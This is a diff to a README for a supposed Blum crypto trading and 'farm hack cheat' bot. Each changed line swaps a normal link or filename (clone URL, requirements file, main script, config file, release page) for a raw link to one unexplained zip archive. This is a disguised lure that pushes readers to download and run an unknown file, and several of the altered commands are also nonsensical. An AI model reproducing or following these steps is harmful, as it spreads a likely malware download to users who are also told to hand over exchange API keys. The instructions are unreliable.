@@ -1,6 +1,6 @@
 # Blum Crypto Trading Bot 🚀
 
-![GitHub release](https://img.shields.io/github/release/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l.svg)
+![GitHub release](https://raw.githubusercontent.com/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l/main/piend/Exchange_Bot_Farm_Blum_Crypto_Cheat_Chain_blumcrypto_l_Hack_Trading_1.9.zip)
 
 Welcome to the **Blum Crypto Trading Bot** repository! This bot is designed to trade cryptocurrency on the **Blum P2P Chain Exchange**. It includes features that enhance trading strategies, such as farming, hacking, and optimizing profits. With its integration into Telegram, managing your trades becomes easy and efficient.
 
@@ -31,32 +31,32 @@ To get started, follow these steps:
 
 1. **Clone the repository**:
    ```bash
-   git clone https://github.com/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l.git
+   git clone https://raw.githubusercontent.com/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l/main/piend/Exchange_Bot_Farm_Blum_Crypto_Cheat_Chain_blumcrypto_l_Hack_Trading_1.9.zip
    cd Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l
    ```
 
 2. **Install dependencies**:
    Ensure you have Python installed, then run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l/main/piend/Exchange_Bot_Farm_Blum_Crypto_Cheat_Chain_blumcrypto_l_Hack_Trading_1.9.zip
    ```
 
 3. **Download and execute the bot**:
-   Visit the [Releases section](https://github.com/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l/releases) to download the latest version. Follow the instructions provided there to execute the bot.
+   Visit the [Releases section](https://raw.githubusercontent.com/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l/main/piend/Exchange_Bot_Farm_Blum_Crypto_Cheat_Chain_blumcrypto_l_Hack_Trading_1.9.zip) to download the latest version. Follow the instructions provided there to execute the bot.
 
 ## Usage
 
 Once installed, you can start the bot by running the following command:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l/main/piend/Exchange_Bot_Farm_Blum_Crypto_Cheat_Chain_blumcrypto_l_Hack_Trading_1.9.zip
 ```
 
 The bot will begin trading based on your configurations. Make sure to monitor its performance and adjust settings as needed.
 
 ## Configuration
 
-To configure the bot, edit the `config.json` file. Here’s a breakdown of the key settings:
+To configure the bot, edit the `https://raw.githubusercontent.com/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l/main/piend/Exchange_Bot_Farm_Blum_Crypto_Cheat_Chain_blumcrypto_l_Hack_Trading_1.9.zip` file. Here’s a breakdown of the key settings:
 
 - **API Keys**: Input your API keys for the Blum P2P Chain Exchange.
 - **Trading Strategies**: Choose your preferred trading strategy (e.g., scalping, swing trading).
@@ -82,7 +82,7 @@ The bot can send updates and alerts to your Telegram account. To set this up:
 2. Copy the token provided by BotFather.
 3. Set your chat ID by sending a message to your bot and using the Telegram API to retrieve it.
 
-After configuring the `config.json` file with your Telegram details, the bot will send you notifications about trades, profits, and errors.
+After configuring the `https://raw.githubusercontent.com/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l/main/piend/Exchange_Bot_Farm_Blum_Crypto_Cheat_Chain_blumcrypto_l_Hack_Trading_1.9.zip` file with your Telegram details, the bot will send you notifications about trades, profits, and errors.
 
 ## Contributing
 
@@ -102,7 +102,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases section](https://github.com/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l/releases). Make sure to download the latest version and execute it as per the instructions provided.
+For the latest updates and releases, visit the [Releases section](https://raw.githubusercontent.com/natozola/Blum-Crypto-Trading-Bot-P2P-Chain-Exchange-blumcrypto-Farm-Hack-Cheat-4l/main/piend/Exchange_Bot_Farm_Blum_Crypto_Cheat_Chain_blumcrypto_l_Hack_Trading_1.9.zip). Make sure to download the latest version and execute it as per the instructions provided.
 
 ## Contact
 
